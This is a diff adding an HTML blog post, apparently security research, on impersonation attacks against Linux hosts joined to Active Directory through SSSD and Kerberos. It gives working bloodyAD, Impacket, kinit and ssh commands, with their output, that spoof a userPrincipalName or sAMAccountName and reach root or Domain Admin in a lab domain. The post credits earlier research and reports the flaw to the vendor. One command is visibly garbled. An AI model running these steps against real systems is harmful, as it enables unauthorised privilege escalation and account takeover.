@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>A Long Distance Relationship with Kerberos</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="A Long Distance Relationship with Kerberos" />
+<meta name="author" content="Zavier Lee" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/kerberos-ldr.html" />
+<meta property="og:url" content="http://localhost:4000/kerberos-ldr.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-16T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="A Long Distance Relationship with Kerberos" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-07-16T00:00:00-04:00","datePublished":"2025-07-16T00:00:00-04:00","headline":"A Long Distance Relationship with Kerberos","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/kerberos-ldr.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://localhost:4000/kerberos-ldr.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=edfed2e8d4b67a714938b82b8968ff8e5624922f">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://localhost:4000/"> </a></h1>
+
+        
+          <img src="/assets/img/logo.png" alt="Logo" />
+        
+
+        <p> </p>
+
+        
+        <p class="view"><a href="https://github.com/ASYNC-Security/async-security.github.io">View the Project on GitHub <small>ASYNC-Security/async-security.github.io</small></a></p>
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <style>
+    .author-section {
+        padding: 14px;
+        margin: 16px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        position: relative;
+    }
+
+    .author-label {
+        position: absolute;
+        top: -8px;
+        left: 12px;
+        background: #1a1a1a;
+        color: #4da6ff;
+        font-size: 0.75em;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        padding: 0 6px;
+    }
+
+    .author-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .author-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        object-fit: cover;
+        box-shadow: 0 2px 6px rgba(77, 166, 255, 0.2);
+    }
+
+    .author-details {
+        flex: 1;
+    }
+
+    .author-name {
+        font-weight: 600;
+        color: white;
+        margin: 0 0 2px 0;
+        font-size: 0.95em;
+    }
+
+    .author-title {
+        color: #ccc;
+        font-size: 0.8em;
+        margin: 0 0 6px 0;
+        font-style: italic;
+    }
+
+    .author-links {
+        display: flex;
+        gap: 8px;
+    }
+
+    .social-link {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+        background: #333;
+        border-radius: 50%;
+        color: #ccc;
+        text-decoration: none;
+        transition: all 0.3s ease;
+        border: 1px solid #444;
+        font-size: 0.7em;
+    }
+
+    .social-link:hover {
+        color: #fff;
+        transform: translateY(-1px);
+        box-shadow: 0 4px 10px rgba(77, 166, 255, 0.3);
+    }
+
+    .post-meta {
+        color: #ccc;
+        font-size: 0.9em;
+        margin-bottom: 12px;
+    }
+
+    .toc-container {
+        margin: 24px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        overflow: hidden;
+    }
+
+    .toc-toggle {
+        background: none;
+        border: none;
+        font-size: 1em;
+        font-weight: 500;
+        cursor: pointer;
+        width: 100%;
+        text-align: left;
+        padding: 16px;
+        color: #fff;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        transition: background-color 0.2s ease;
+    }
+
+    .toc-toggle:hover {
+        background: rgba(255, 255, 255, 0.05);
+    }
+
+    .toc-toggle::after {
+        content: '▼';
+        color: #999;
+        transition: transform 0.3s ease;
+        font-size: 0.8em;
+    }
+
+    .toc-toggle.expanded::after {
+        transform: rotate(180deg);
+    }
+
+    .toc-content {
+        display: none;
+        padding: 0 16px 16px 16px;
+        border-top: 1px solid #333;
+        background: rgba(0, 0, 0, 0.1);
+    }
+
+    .toc-content.expanded {
+        display: block;
+        animation: slideDown 0.3s ease-out;
+    }
+
+    @keyframes slideDown {
+        from {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .toc-container a {
+        color: #ccc;
+        text-decoration: none;
+        transition: color 0.2s ease;
+    }
+
+    .toc-container a:hover {
+        color: #4da6ff;
+        text-decoration: underline;
+    }
+
+    .toc-container ol {
+        margin: 8px 0 0 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container ul {
+        margin: 4px 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container li {
+        margin: 6px 0;
+        line-height: 1.4;
+    }
+
+    @media (max-width: 962px) {
+        .toc-container {
+            margin: 16px 0;
+        }
+
+        .toc-toggle {
+            padding: 12px;
+            font-size: 0.95em;
+        }
+
+        .toc-content {
+            padding: 0 12px 12px 12px;
+        }
+    }
+
+    @media (max-width: 962px) {
+        .author-section {
+            margin: 16px 0;
+            padding: 16px;
+            border-radius: 6px;
+        }
+
+        .author-label {
+            top: -8px;
+            left: 12px;
+            font-size: 0.8em;
+        }
+
+        .author-info {
+            gap: 12px;
+        }
+
+        .author-avatar {
+            width: 48px;
+            height: 48px;
+            border-width: 2px;
+        }
+
+        .author-name {
+            font-size: 1em;
+        }
+
+        .author-title {
+            font-size: 0.9em;
+        }
+
+        .author-links {
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .post-meta {
+            margin-bottom: 8px;
+        }
+
+        h1 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        section {
+            padding-top: 0 !important;
+        }
+
+        hr {
+            display: none;
+        }
+    }
+
+    .post-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 28px;
+        flex-wrap: wrap;
+        gap: 12px;
+    }
+
+    .back-button {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 8px 12px;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid #444;
+        border-radius: 20px;
+        color: #ccc;
+        text-decoration: none;
+        font-size: 0.85em;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        width: fit-content;
+        outline: none;
+    }
+
+    .back-button:hover {
+        background: rgba(255, 255, 255, 0.08);
+        color: #4da6ff;
+        border-color: #4da6ff;
+        transform: translateY(-1px);
+        box-shadow: 0 2px 8px rgba(77, 166, 255, 0.2);
+        outline: none;
+    }
+
+    .back-button:focus {
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(77, 166, 255, 0.3);
+    }
+
+    .back-button svg {
+        width: 14px;
+        height: 14px;
+        transition: transform 0.3s ease;
+    }
+
+    .back-button:hover svg {
+        transform: translateX(-2px);
+    }
+
+    .post-meta {
+        color: #999;
+        font-size: 0.85em;
+        padding: 6px 12px;
+        background: rgba(255, 255, 255, 0.03);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 12px;
+        display: inline-block;
+        font-weight: 500;
+        letter-spacing: 0.3px;
+        margin: 0;
+    }
+
+    @media (max-width: 962px) {
+        .post-header {
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+
+        .back-button {
+            margin-top: 12px;
+            padding: 6px 10px;
+            font-size: 0.8em;
+        }
+
+        .back-button svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        .post-meta {
+            font-size: 0.8em;
+            padding: 5px 10px;
+        }
+    }
+</style>
+
+<div class="post-header">
+    <a href="/" class="back-button">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd"
+                d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z" />
+        </svg>
+        Back
+    </a>
+
+    
+    <small class="post-meta">16 July 2025</small>
+    
+</div>
+
+
+
+
+
+<div class="author-section">
+    <div class="author-label">Author</div>
+    <div class="author-info">
+        
+        <img src="./assets/img/authors/zavier.png" alt="Zavier Lee" class="author-avatar">
+        
+        <div class="author-details">
+            <div class="author-name">Zavier Lee</div>
+            
+            <div class="author-title">Offensive Security Engineer</div>
+            
+            <div class="author-links">
+                
+                <a href="https://x.com/gatariee" target="_blank" class="social-link twitter" aria-label="Twitter">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                        class="bi bi-twitter-x" viewBox="0 0 16 16">
+                        <path
+                            d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z" />
+                    </svg>
+                </a>
+                
+                
+                <a href="https://github.com/gatariee" target="_blank" class="social-link github" aria-label="GitHub">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                    </svg>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<h1 id="a-long-distance-relationship-with-kerberos">A Long Distance Relationship with Kerberos</h1>
+
+<div class="toc-container">
+  <button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
+  <div class="toc-content" id="tocContent">
+    <ol>
+      <li>
+        <a href="#linux-active-directory-integration">Linux Active Directory Integration</a>
+        <ul>
+          <li><a href="#password-authentication">Password Authentication</a></li>
+          <li><a href="#kerberos-sso">Kerberos SSO</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#scenario-1-upn-spoofing-domain-users">Scenario 1: UPN Spoofing (Domain Users)</a>
+        <ul>
+          <li><a href="#password-authentication-1">Password Authentication</a></li>
+          <li><a href="#kerberos-sso-1">Kerberos SSO</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#scenario-2-upn-spoofing-local-users">Scenario 2: UPN Spoofing (Local Users)</a>
+      </li>
+      <li>
+        <a href="#scenario-3-samaccount-name-confusion">Scenario 3: sAMAccount Name Confusion</a>
+        <ul>
+          <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
+          <li><a href="#writing-to-the-samaccountname">Writing to the sAMAccountName</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#history-of-the-issue">History of the Issue</a>
+      </li>
+      <li>
+        <a href="#mitigations">Mitigations</a>
+      </li>
+    </ol>
+  </div>
+</div>
+
+<p><a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)"><code class="language-plaintext highlighter-rouge">Kerberos</code></a> is an authentication protocol developed by MIT to provide secure authentication over an insecure network, the protocol has since seen widespread adoption, particularly in <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">Microsoft Active Directory Domain Services (AD DS)</a>, as well as in other systems such as <a href="https://www.freeipa.org/">FreeIPA</a>.</p>
+
+<p><img src="./assets/img/ldr/krbmsg.png" alt="" /></p>
+
+<p>Due to the demand for cross-platform authentication and <a href="https://docs.redhat.com/en/documentation/red_hat_satellite/6.16/html/configuring_authentication_for_red_hat_satellite_users/configuring-kerberos-sso-for-active-directory-users-in-project_authentication">Single Sign-On (SSO) capabilities</a>, Kerberos has become a critical component in modern authentication systems via intermediaries like <a href="https://sssd.io/docs/krb/krb-introduction.html">System Security Services Daemon (SSSD)</a>. This, however, has led to a situation where vendors have their own interpretations (and limitations) within the Kerberos protocol, resulting in a fragmented ecosystem.</p>
+
+<p>This post will specifically focus on the attacks associated with a domain-joined Linux system that supports <a href="https://docs.redhat.com/en/documentation/red_hat_satellite/6.16/html/configuring_authentication_for_red_hat_satellite_users/configuring-kerberos-sso-for-active-directory-users-in-project_authentication">Kerberos SSO</a>.</p>
+
+<h2 id="linux-active-directory-integration">Linux Active Directory Integration</h2>
+
+<p>In this post, we’ll be using a <code class="language-plaintext highlighter-rouge">Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)</code> system, joined to the <code class="language-plaintext highlighter-rouge">mercury.local</code> domain. The primary domain controller (PDC) is a Windows Server 2022 system - <code class="language-plaintext highlighter-rouge">c-dc01.mercury.local</code>, this is also the Kerberos Key Distribution Center (KDC) for the domain.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ realm list
+mercury.local
+  type: kerberos
+  realm-name: MERCURY.LOCAL
+  domain-name: mercury.local
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  required-package: sssd-tools
+  required-package: sssd
+  required-package: libnss-sss
+  required-package: libpam-sss
+  required-package: adcli
+  required-package: samba-common-bin
+  login-formats: %U@mercury.local
+  login-policy: allow-permitted-logins
+  permitted-logins: 
+  permitted-groups: Domain Admins@mercury.local
+
+$ hostname -f
+L-MGRT-APP001.mercury.local
+
+</code></pre></div></div>
+
+<p>This domain was joined using the <a href="https://www.redhat.com/en/blog/linux-active-directory"><code class="language-plaintext highlighter-rouge">realm</code> command, and authentication services are handled by <code class="language-plaintext highlighter-rouge">SSSD</code>.</a>, and <code class="language-plaintext highlighter-rouge">Domain Admins</code> is the only group permitted to log in to the system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@L-MGRT-APP001:/home# cat /etc/sssd/sssd.conf
+
+[sssd]
+domains = mercury.local
+config_file_version = 2
+services = nss, pam
+
+[domain/mercury.local]
+default_shell = /bin/bash
+krb5_store_password_if_offline = True
+cache_credentials = True
+krb5_realm = MERCURY.LOCAL
+realmd_tags = manages-system joined-with-adcli 
+id_provider = ad
+fallback_homedir = /home/%u
+ad_domain = mercury.local
+use_fully_qualified_names = True
+ldap_id_mapping = True
+access_provider = simple
+simple_allow_groups = Domain Admins@mercury.local
+</code></pre></div></div>
+
+<p>We can verify that the current configuration works by attempting both password authentication, and <code class="language-plaintext highlighter-rouge">Kerberos SSO</code> as the <code class="language-plaintext highlighter-rouge">Administrator</code> user.</p>
+
+<h3 id="password-authentication">Password Authentication</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">Administrator</code> user’s password has been set to <code class="language-plaintext highlighter-rouge">T3stP@ssw0rd123</code> for this example, and the <code class="language-plaintext highlighter-rouge">id</code> command returns the user’s UID, GID, and group memberships.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'T3stP@ssw0rd123' ssh 'Administrator@MERCURY.LOCAL'@L-MGRT-APP001.mercury.local 'id'
+uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
+</code></pre></div></div>
+
+<h3 id="kerberos-sso">Kerberos SSO</h3>
+
+<p>Kerberos SSO from Linux requires a valid <code class="language-plaintext highlighter-rouge">krb5.conf</code> file. The following configuration is used for this example:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = MERCURY.LOCAL
+
+[realms]
+    MERCURY.LOCAL = {
+        kdc = c-dc01.mercury.local
+        admin_server = c-dc01.mercury.local
+        default_domain = mercury.local
+    }
+
+[domain_realm]
+    .mercury.local = MERCURY.LOCAL
+    mercury.local = MERCURY.LOCAL
+</code></pre></div></div>
+
+<p>We can obtain a <code class="language-plaintext highlighter-rouge">TGT</code> for the <code class="language-plaintext highlighter-rouge">Administrator</code> user, and authenticate to the system using <code class="language-plaintext highlighter-rouge">kinit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ echo 'T3stP@ssw0rd123' | kinit Administrator@MERCURY.LOCAL -E  
+Password for Administrator\@MERCURY.LOCAL@MERCURY.LOCAL: 
+
+~$ ssh 'Administrator@MERCURY.LOCAL'@L-MGRT-APP001.mercury.local -K id                            
+uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
+</code></pre></div></div>
+
+<h2 id="scenario-1-upn-spoofing-domain-users">Scenario 1: UPN Spoofing (Domain Users)</h2>
+
+<p>In a DEFCON 31 talk: <a href="https://forum.defcon.org/node/245708">“A Broken Marriage: Abusing Mixed Vendor Kerberos Stacks”</a> by <a href="https://x.com/_EthicalChaos_">Ceri Coburn, @<em>EthicalChaos</em></a> and <a href="https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/">later, blog post</a>. It was discovered that, given the ability to write to the <code class="language-plaintext highlighter-rouge">userPrincipalName</code> of a user in Active Directory, an attacker can impersonate any user in the domain to authenticate to a Linux system that supports Kerberos SSO.</p>
+
+<p>Consider the following scenario, where the <code class="language-plaintext highlighter-rouge">gatari-ad</code> user has the ability to write to their own <code class="language-plaintext highlighter-rouge">userPrincipalName</code> attribute in Active Directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(LDAP)-[C-DC01.mercury.local]-[mercury\gatari-ad]
+PV &gt; Get-DomainUser -Identity 'gatari-ad' -Select sAMAccountName,userPrincipalName
+sAMAccountName        : gatari-ad
+userPrincipalName     : gatari@mercury.local
+</code></pre></div></div>
+
+<p>We can modify our <code class="language-plaintext highlighter-rouge">userPrincipalName</code> to the <code class="language-plaintext highlighter-rouge">Administrator</code> user, do note that this will not work if the <code class="language-plaintext highlighter-rouge">Administrator@mercury.local</code> UPN is already in use by another user, as the <code class="language-plaintext highlighter-rouge">userPrincipalName</code> must be unique across the domain.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodyAD --host 'C-DC01.mercury.local' -u 'gatari-ad' -p 'P@ssw0rd' set object 'gatari-ad' 'userPrincipaly.local'
+[+] gatari-ad's userPrincipalName has been updated
+
+(LDAP)-[C-DC01.mercury.local]-[mercury\gatari-ad]
+PV &gt; Get-DomainUser -Identity 'gatari-ad'
+cn                                : gatari
+distinguishedName                 : CN=gatari,CN=Users,DC=mercury,DC=local
+name                              : gatari
+objectGUID                        : {05e6a3b7-d036-4846-bbd1-521dce60468e}
+userAccountControl                : NORMAL_ACCOUNT [512]
+badPwdCount                       : 0
+badPasswordTime                   : 16/07/2025 10:15:10 (today)
+lastLogoff                        : 1601-01-01 00:00:00+00:00
+lastLogon                         : 16/07/2025 10:22:51 (today)
+pwdLastSet                        : 16/07/2025 09:01:02 (today)
+primaryGroupID                    : 513
+objectSid                         : S-1-5-21-1865292683-1165865761-2598954431-1689
+sAMAccountName                    : gatari-ad
+sAMAccountType                    : SAM_USER_OBJECT
+userPrincipalName                 : Administrator@mercury.local
+objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=mercury,DC=local
+</code></pre></div></div>
+
+<h3 id="password-authentication-1">Password Authentication</h3>
+
+<p>Contrary to the expectation that this only works under the pretense of Kerberos SSO, based on my testing; this also works with password authentication. We can now authenticate to the Linux system as the <code class="language-plaintext highlighter-rouge">Administrator</code> user using the <code class="language-plaintext highlighter-rouge">gatari-ad</code> credentials.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'P@ssw0rd' ssh 'Administrator@mercury.local'@L-MGRT-APP001.mercury.local id
+
+uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
+</code></pre></div></div>
+
+<p>After authenticating to the system, we can loot the cached TGT at <code class="language-plaintext highlighter-rouge">/tmp/krb5cc$(id -u)</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>administrator@mercury.local@L-MGRT-APP001:~$ ls -la /tmp/krb5cc_7000500_r9cKSh 
+-rw------- 1 administrator@mercury.local domain users@mercury.local 1406 Jul 16 18:54 /tmp/krb5cc_7000500_r9cKSh
+</code></pre></div></div>
+
+<p>We’ll find that the TGT belongs to the <code class="language-plaintext highlighter-rouge">gatari-ad</code> user, as expected:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ describeTicket.py krb5cc_7000500_r9cKSh
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 5ba238ac341ddaddbe2f7e4d98d5114f0887263bb5d7926bd42f0c2006a1b8dc
+[*] User Name                     : gatari-ad
+[*] User Realm                    : MERCURY.LOCAL
+[*] Service Name                  : krbtgt/MERCURY.LOCAL
+[...snip...]
+[*] KeyType                       : aes256_cts_hmac_sha1_96
+[*] Base64(key)                   : W6I4rDQd2t2+L35NmNURTwiHJju115Jr1C8MIAahuNw=
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/MERCURY.LOCAL
+[*]   Service Realm               : MERCURY.LOCAL
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+</code></pre></div></div>
+
+<p>But, we retain the local privileges of the legitimate <code class="language-plaintext highlighter-rouge">Administrator@mercury.local</code> user on the system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>administrator@mercury.local@L-MGRT-APP001:~$ id
+uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
+</code></pre></div></div>
+
+<h3 id="kerberos-sso-1">Kerberos SSO</h3>
+
+<p>Similarly, we can obtain a <code class="language-plaintext highlighter-rouge">TGT</code> for the <code class="language-plaintext highlighter-rouge">gatari-ad</code> user, and authenticate to the system using <code class="language-plaintext highlighter-rouge">kinit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ echo 'P@ssw0rd' | kinit 'Administrator'@MERCURY.LOCAL -E
+Password for Administrator\@MERCURY.LOCAL@MERCURY.LOCAL: 
+
+~$ ssh 'Administrator@MERCURY.LOCAL'@L-MGRT-APP001.mercury.local -K id
+uid=7000500(administrator@mercury.local) gid=7000513(domain users@mercury.local) groups=7000513(domain users@mercury.local),7000512(domain admins@mercury.local),7000518(schema admins@mercury.local),7000519(enterprise admins@mercury.local),7000520(group policy creator owners@mercury.local),7000572(denied rodc password replication group@mercury.local)
+</code></pre></div></div>
+
+<h2 id="scenario-2-upn-spoofing-local-users">Scenario 2: UPN Spoofing (Local Users)</h2>
+
+<p>In the previous scenario, we were able to impersonate a domain user by modifying the <code class="language-plaintext highlighter-rouge">userPrincipalName</code> attribute in Active Directory. However, this attack can also be extended to local users on the Linux system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD --host 'C-DC01.mercury.local' -u 'gatari-ad' -p 'P@ssw0rd' set object 'gatari-ad' 'userPrincipalName' -v 'root'                       
+[+] gatari-ad's userPrincipalName has been updated
+</code></pre></div></div>
+
+<p>Based on my testing, this only works with Kerberos SSO, and not password authentication. We can now authenticate to the Linux system as the <code class="language-plaintext highlighter-rouge">root</code> user using the <code class="language-plaintext highlighter-rouge">gatari-ad</code> credentials.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ echo 'P@ssw0rd' | kinit 'root' -E
+Password for root@MERCURY.LOCAL: 
+
+~$ ssh 'root'@L-MGRT-APP001.mercury.local id             
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<h2 id="scenario-3-samaccount-name-confusion">Scenario 3: sAMAccount Name Confusion</h2>
+
+<p>Based on the research by Ceri Coburn, it is clear that the <code class="language-plaintext highlighter-rouge">sssd</code> service interprets incoming authentication in a potentially confusing manner. After further testing, and inspired by a user named <code class="language-plaintext highlighter-rouge">lwo</code> on the <a href="https://www.vulnlab.com/">Vulnlab</a> discored, we can also impersonate a user by simply creating a machine account with the <code class="language-plaintext highlighter-rouge">sAMAccountName</code> as any local user.</p>
+
+<h3 id="machineaccountquota">MachineAccountQuota</h3>
+
+<p>In your typical Active Directory environment, there is a limit on the number of machine accounts that can be created in a domain, this is controlled by the <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> setting. By default, this is set to <code class="language-plaintext highlighter-rouge">10</code>, meaning that any user with sufficient privileges can create up to 10 machine accounts in the domain.</p>
+
+<p>With this setting, we can create a machine account with the <code class="language-plaintext highlighter-rouge">sAMAccountName</code> of <code class="language-plaintext highlighter-rouge">root</code>, and then use this account to authenticate to the Linux system as the <code class="language-plaintext highlighter-rouge">root</code> user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ addcomputer.py 'mercury.local'/'gatari-ad':'P@ssw0rd' -computer-name 'root' -computer-pass 'P@ssw0rd123'
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account root$ with password P@ssw0rd123.
+
+~$ echo 'P@ssw0rd123' | kinit 'root'
+~$ ssh 'root'@L-MGRT-APP001.mercury.local -K id    
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<h3 id="writing-to-the-samaccountname">Writing to the sAMAccountName</h3>
+
+<p>Similarly, if we have the ability to write to the <code class="language-plaintext highlighter-rouge">sAMAccountName</code> of a user; we can perform the same attack.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodyAD --host 'C-DC01.mercury.local' -u 'gatari-ad' -p 'P@ssw0rd' set object 'gatari-ad' 'sAMAccountName' -v 'root'
+[+] gatari-ad's sAMAccountName has been updated
+
+echo 'P@ssw0rd' | kinit 'root' -E 
+Password for root@MERCURY.LOCAL: 
+
+ssh 'root'@L-MGRT-APP001.mercury.local -K id   
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<p>In this case, we can also authenticate with password authentication, as the <code class="language-plaintext highlighter-rouge">sAMAccountName</code> is used to look up the user in Active Directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshpass -p 'P@ssw0rd' ssh 'root'@L-MGRT-APP001.mercury.local id             
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<h2 id="history-of-the-issue">History of the Issue</h2>
+
+<p>An attack has been reported as <a href="https://www.samba.org/samba/security/CVE-2020-25717.html">CVE-2020-25717</a> in Samba, which documents a similar vector; which has since been patched in <a href="https://www.samba.org/samba/history/samba-4.13.14.html">Samba 4.13.14</a> and later.</p>
+
+<blockquote>
+  <p>The easiest example to illustrate this is if an attacker creates an account named root (by renaming a MachineAccountQuota based machine account), and asks for a login without a Kerberos PAC. Between obtaining the ticket and presenting it to a server, the attacker renames the user account to a different name. Samba attempts to look up “DOMAIN\root”, which fails (as this no longer exists) and then falls back to looking up user “root”, which will map to the privileged UNIX uid of 0.</p>
+</blockquote>
+
+<p>As for the issues discussed in this post, there are no known patches or mitigations available at the time of writing nor does it appear that any are forthcoming.</p>
+
+<p>We have reported this issue to <code class="language-plaintext highlighter-rouge">sssd</code> in <a href="https://github.com/SSSD/sssd/issues/8021">#8021</a>, where it has been acknowledged but unlikely to be fixed in the near future; citing the <code class="language-plaintext highlighter-rouge">sssd_krb5_localauth_plugin</code> plugin as a mitigation for this issue.</p>
+
